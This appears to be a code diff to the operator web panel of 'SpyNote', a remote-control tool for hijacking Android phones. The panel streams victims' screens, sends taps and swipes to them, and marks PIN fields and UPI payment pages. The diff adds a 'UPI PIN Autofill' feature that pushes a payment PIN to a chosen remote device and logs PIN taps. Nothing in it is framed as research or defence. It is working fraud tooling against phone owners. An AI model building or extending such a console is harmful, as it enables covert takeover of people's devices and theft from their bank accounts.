@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote - UPI Control</title>
+    <title>📱 SpyNote - UPI Control Pro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <style>
@@ -33,16 +33,15 @@
         }
         #layout-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            pointer-events: auto; border-radius: 25px; z-index: 20;
+            pointer-events: none; border-radius: 25px; z-index: 10;
         }
         .layout-element {
-            position: absolute; background: rgba(0,255,136,0.4); border: 2px solid #00ff88;
-            border-radius: 6px; transition: all 0.1s; cursor: pointer;
-            backdrop-filter: blur(1px);
+            position: absolute; background: rgba(0,255,136,0.3); border: 2px solid #00ff88;
+            border-radius: 4px; transition: all 0.2s; cursor: pointer;
         }
-        .layout-element:hover { background: rgba(0,255,136,0.7); transform: scale(1.05); box-shadow: 0 0 10px #00ff88; }
-        .pin-element { background: rgba(255,100,100,0.6) !important; border-color: #ff6666 !important; box-shadow: 0 0 15px #ff6666 !important; }
-        .pin-element:hover { background: rgba(255,100,100,0.9) !important; }
+        .layout-element:hover { background: rgba(0,255,136,0.6); transform: scale(1.02); }
+        .pin-element { background: rgba(255,100,100,0.5) !important; border-color: #ff6666 !important; }
+        .upi-page { background: rgba(255,215,0,0.6) !important; border-color: #ffd700 !important; }
 
         #stats { 
             position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
@@ -54,16 +53,54 @@
             display: flex; gap: 10px; background: rgba(0,0,0,0.9); padding: 15px 25px;
             border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #444;
         }
+        #upi-panel {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            background: rgba(0,0,0,0.98); padding: 30px; border-radius: 20px; 
+            backdrop-filter: blur(30px); border: 2px solid #00ff88; display: none;
+            z-index: 1000; min-width: 350px;
+        }
+        #pin-input { 
+            width: 100%; padding: 20px; font-size: 24px; text-align: center; 
+            background: #111; color: #00ff88; border: 2px solid #00ff88; 
+            border-radius: 15px; margin: 15px 0; font-family: monospace;
+        }
         button {
             padding: 12px 20px; background: linear-gradient(45deg, #007bff, #0056b3); 
             color: white; border: none; border-radius: 20px; cursor: pointer; 
             font-weight: 600; transition: all 0.3s; box-shadow: 0 5px 20px rgba(0,123,255,0.4);
+            margin: 5px;
         }
         button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,123,255,0.6); }
-        .layout-toggle { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; }
+        .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
+        .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
+        .upi-toggle { background: linear-gradient(45deg, #ffd700, #ffaa00); color: #000; }
+        .upi-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
+        .autofill-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a5a) !important; }
+        #overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.8); z-index: 999; display: none; 
+        }
     </style>
 </head>
 <body>
+    <div id="overlay" onclick="closeUpiPanel()"></div>
+    
+    <div id="upi-panel">
+        <h3 style="color: #00ff88; margin-bottom: 20px;">🔐 UPI PIN Autofill</h3>
+        <input type="password" id="pin-input" maxlength="6" placeholder="Enter 4-6 digit PIN">
+        <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
+            <button onclick="setPin('1234')">1️⃣2️⃣3️⃣4️⃣</button>
+            <button onclick="setPin('5678')">5️⃣6️⃣7️⃣8️⃣</button>
+            <button onclick="setPin('0000')">0️⃣0️⃣0️⃣0️⃣</button>
+            <button onclick="clearPin()">🗑️ Clear</button>
+        </div>
+        <div style="margin-top: 20px;">
+            <button class="autofill-btn" onclick="startAutofill()">🚀 Start Autofill</button>
+            <button onclick="closeUpiPanel()">❌ Close</button>
+        </div>
+        <div id="autofill-status" style="margin-top: 15px; font-size: 14px;"></div>
+    </div>
+
     <div id="devices">
         <h3 style="margin-bottom: 15px; color: #00ff88;">📱 Devices Online</h3>
         <div id="device-list">Loading devices...</div>
@@ -73,7 +110,8 @@
         <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
         <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
         <div>Device: <span id="deviceName">-</span></div>
-        <div id="layoutInfo" style="font-size: 11px; color: #00ff88;">🔍 LIVE LAYOUT ON</div>
+        <div id="layoutInfo" style="font-size: 11px; color: #aaa;">Layout: OFF</div>
+        <div id="upiStatus" style="font-size: 11px; color: #ffd700;">UPI Autofill: OFF</div>
     </div>
 
     <div id="phone-frame">
@@ -84,7 +122,8 @@
     <div id="controls">
         <button onclick="sendBack()">🔙 Back</button>
         <button onclick="sendHome()">🏠 Home</button>
-        <button onclick="sendRecent()">📋 Recent</button>
+        <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">🗺️ Layout</button>
+        <button class="upi-toggle" onclick="toggleUpiPanel()" id="upiBtn">🔐 UPI</button>
         <button onclick="toggleFullScreen()">📱 Full</button>
     </div>
 
@@ -95,8 +134,11 @@
         let frameCount = 0, lastFrameTime = 0, avgFps = 0;
         let frameQueue = [];
         let isDragging = false, dragStart = {};
+        let showLayout = false;
         let layoutElements = [];
         let canvas, ctx, overlayCtx, phoneFrame;
+        let currentPin = '';
+        let autofillEnabled = false;
 
         canvas = document.getElementById('screen-canvas');
         overlayCtx = document.getElementById('layout-overlay').getContext('2d');
@@ -127,6 +169,11 @@
             }
         });
 
+        socket.on('upi-status', (status) => {
+            document.getElementById('upiStatus').textContent = `UPI Autofill: ${status.enabled ? '🟢 ON' : '🔴 OFF'}`;
+            document.getElementById('upiStatus').style.color = status.enabled ? '#00ff88' : '#ff6b6b';
+        });
+
         function renderNextFrame() {
             if (frameQueue.length === 0) return;
             
@@ -143,8 +190,7 @@
                 screenCtx.clearRect(0, 0, canvas.width, canvas.height);
                 screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                 
-                // 🔥 ALWAYS RENDER LAYOUT - Fixed black screen issue
-                if (data.layout && data.layout.length > 0) {
+                if (showLayout && data.layout) {
                     renderLayoutOverlay(data.layout, rect);
                 }
                 
@@ -166,26 +212,26 @@
             overlayCtx.clearRect(0, 0, rect.width, rect.height);
             layoutElements = [];
             
-            layout.forEach((element, index) => {
+            layout.forEach((element) => {
                 const x = (element.bounds.left / deviceWidth) * rect.width;
                 const y = (element.bounds.top / deviceHeight) * rect.height;
                 const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                 const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                 
-                const isPin = element.isPin || (element.text && (element.text.match(/\d/) || element.contentDescription?.match(/\d/)));
+                const isPin = element.isPin;
+                const isUpiPage = element.isUpiPage;
                 
-                // 🔥 Create HTML overlay for better performance
-                const el = document.createElement('div');
-                el.className = `layout-element ${isPin ? 'pin-element' : ''}`;
-                el.style.left = x + 'px';
-                el.style.top = y + 'px';
-                el.style.width = w + 'px';
-                el.style.height = h + 'px';
-                el.title = `${element.text || element.contentDescription || ''}\n(${Math.round(x)},${Math.round(y)})`;
-                el.innerHTML = `<span style="font-size:11px;font-weight:bold;color:${isPin?'#fff':'#000'};position:absolute;top:2px;left:2px;text-shadow:1px 1px 2px rgba(0,0,0,0.8);">${(element.text||element.contentDescription||'').slice(0,6)}</span>`;
+                overlayCtx.fillStyle = isUpiPage ? 'rgba(255,215,0,0.5)' : 
+                                     isPin ? 'rgba(255,100,100,0.4)' : 'rgba(0,255,136,0.3)';
+                overlayCtx.strokeStyle = isUpiPage ? '#ffd700' : 
+                                       isPin ? '#ff6666' : '#00ff88';
+                overlayCtx.lineWidth = 3;
+                overlayCtx.strokeRect(x, y, w, h);
+                overlayCtx.font = 'bold 14px monospace';
+                overlayCtx.fillStyle = isUpiPage ? '#ffd700' : isPin ? '#ff6666' : '#00ff88';
+                overlayCtx.fillText(`${element.text?.slice(0,8) || element.contentDescription?.slice(0,8) || ''}`, x+5, y+22);
                 
-                overlayCanvas.parentNode.appendChild(el);
-                layoutElements.push({ x, y, w, h, isPin, element, htmlEl: el });
+                layoutElements.push({ x, y, w, h, isPin, isUpiPage, element });
             });
         }
 
@@ -209,8 +255,6 @@
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
             frameQueue = [];
-            // 🔥 Clear old layout elements
-            document.querySelectorAll('.layout-element').forEach(el => el.remove());
         }
 
         function getScaledCoords(clientX, clientY) {
@@ -221,29 +265,21 @@
             };
         }
 
-        phoneFrame.addEventListener('click', (e) => {
-            e.preventDefault();
-            if (!currentDevice) return;
-            
-            const coords = getScaledCoords(e.clientX, e.clientY);
-            sendTap(coords.x, coords.y);
-        });
-
-        phoneFrame.addEventListener('mousedown', (e) => {
-            e.preventDefault();
-            isDragging = true;
-            dragStart = getScaledCoords(e.clientX, e.clientY);
-        });
-
-        phoneFrame.addEventListener('mousemove', (e) => {
-            if (!isDragging || !currentDevice) return;
-            e.preventDefault();
-            const coords = getScaledCoords(e.clientX, e.clientY);
-            sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
-        });
-
-        phoneFrame.addEventListener('mouseup', (e) => {
-            isDragging = false;
+        ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
+            phoneFrame.addEventListener(event, (e) => {
+                e.preventDefault();
+                const coords = getScaledCoords(e.clientX, e.clientY);
+                
+                if (event === 'mousedown') {
+                    isDragging = true;
+                    dragStart = coords;
+                    sendTap(coords.x, coords.y);
+                } else if (event === 'mousemove' && isDragging) {
+                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
+                } else if (event === 'mouseup') {
+                    isDragging = false;
+                }
+            });
         });
 
         ['touchstart', 'touchmove', 'touchend'].forEach(event => {
@@ -267,7 +303,6 @@
         function sendTap(x, y) {
             if (!currentDevice) return;
             socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
-            console.log('👆 Tap:', x, y);
         }
 
         function sendSwipe(sx, sy, ex, ey) {
@@ -275,13 +310,61 @@
             socket.emit('control', { 
                 deviceId: currentDevice, 
                 action: 'swipe', 
-                startX: sx, startY: sy, endX: ex, endY: ey, duration: 200 
+                startX: sx, startY: sy, endX: ex, endY: ey, duration: 250 
             });
         }
 
         function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
         function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }
-        function sendRecent() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'recent' }); }
+
+        function toggleLayout() {
+            showLayout = !showLayout;
+            const btn = document.getElementById('layoutBtn');
+            const info = document.getElementById('layoutInfo');
+            btn.textContent = showLayout ? '📋 Hide Layout' : '🗺️ Show Layout';
+            btn.classList.toggle('active');
+            info.textContent = `Layout: ${showLayout ? 'ON' : 'OFF'}`;
+            info.style.color = showLayout ? '#00ff88' : '#aaa';
+        }
+
+        function toggleUpiPanel() {
+            const panel = document.getElementById('upi-panel');
+            const overlay = document.getElementById('overlay');
+            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+            overlay.style.display = panel.style.display;
+        }
+
+        function closeUpiPanel() {
+            document.getElementById('upi-panel').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        function setPin(pin) {
+            document.getElementById('pin-input').value = pin;
+            currentPin = pin;
+        }
+
+        function clearPin() {
+            document.getElementById('pin-input').value = '';
+            currentPin = '';
+        }
+
+        function startAutofill() {
+            currentPin = document.getElementById('pin-input').value;
+            if (currentPin.length < 4) {
+                alert('Enter 4-6 digit PIN');
+                return;
+            }
+            
+            if (!currentDevice) {
+                alert('Select a device first');
+                return;
+            }
+
+            socket.emit('set-upi-pin', { deviceId: currentDevice, pin: currentPin });
+            document.getElementById('autofill-status').textContent = `✅ PIN ${currentPin} set for ${currentDevice.slice(0,12)}`;
+            autofillEnabled = true;
+        }
 
         function toggleFullScreen() {
             if (!document.fullscreenElement) {
@@ -290,6 +373,29 @@
                 document.exitFullscreen();
             }
         }
+
+        phoneFrame.addEventListener('click', (e) => {
+            if (!showLayout || !currentDevice) return;
+            const rect = phoneFrame.getBoundingClientRect();
+            const x = (e.clientX - rect.left) * (deviceWidth / rect.width);
+            const y = (e.clientY - rect.top) * (deviceHeight / rect.height);
+            
+            const clickedElement = layoutElements.find(el => 
+                x >= el.x && x <= (el.x + el.w) &&
+                y >= el.y && y <= (el.y + el.h)
+            );
+            
+            if (clickedElement) {
+                sendTap(clickedElement.element.bounds.centerX, clickedElement.element.bounds.centerY);
+                if (clickedElement.isPin) {
+                    console.log('🎯 PIN TAPPED:', clickedElement.element.text);
+                }
+            }
+        });
+
+        document.getElementById('pin-input').addEventListener('input', (e) => {
+            currentPin = e.target.value;
+        });
     </script>
 </body>
 </html>
